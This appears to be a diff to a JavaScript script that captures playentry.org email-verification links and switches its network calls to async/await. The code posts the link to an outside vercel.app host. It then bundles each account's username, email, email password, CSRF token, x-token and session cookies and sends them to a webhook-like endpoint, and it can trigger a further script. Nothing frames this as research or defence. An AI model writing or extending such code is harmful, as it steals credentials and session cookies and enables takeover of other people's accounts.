@@ -58,11 +58,13 @@
                 const p = (o.text || '').match(/https:\/\/playentry\.org\/api\/email\/[^\s\)\]]+/) || ((o.html && o.html[0]) || '').match(/https:\/\/playentry\.org\/api\/email\/[^"'\s\)\]]+/);
                 if (p) {
                     const q = p[0].replace(/\]$/, '');
-                    fetch('https://everythingwillbeokay.vercel.app', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ auth_url: q })
-                    }).then(r => r.json()).then(s => {
+                    try {
+                        const r = await fetch('https://everythingwillbeokay.vercel.app', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ auth_url: q })
+                        });
+                        const s = await r.json();
                         const userData = s.status === '성공' ? { username: l, email: g, email_password: b, csrf: j, xtoken: k, cookie: s.cookies || {} } : null;
                         const t = userData ? `# ${l} - 성공\n\`\`\`\n${JSON.stringify(userData, null, 2)}\n\`\`\`` : `# ${l} - 실패\n\`\`\`리다이렉트 없음\`\`\``;
                         fetch(w, {
@@ -77,7 +79,9 @@
                                 body: JSON.stringify(userData)
                             }).catch(z => x(`em.py 실행 요청 실패: ${z.message}`));
                         }
-                    }).catch(z => x(`서버 전송 실패: ${z.message}`));
+                    } catch (z) {
+                        x(`서버 전송 실패: ${z.message}`);
+                    }
                 }
                 break;
             }
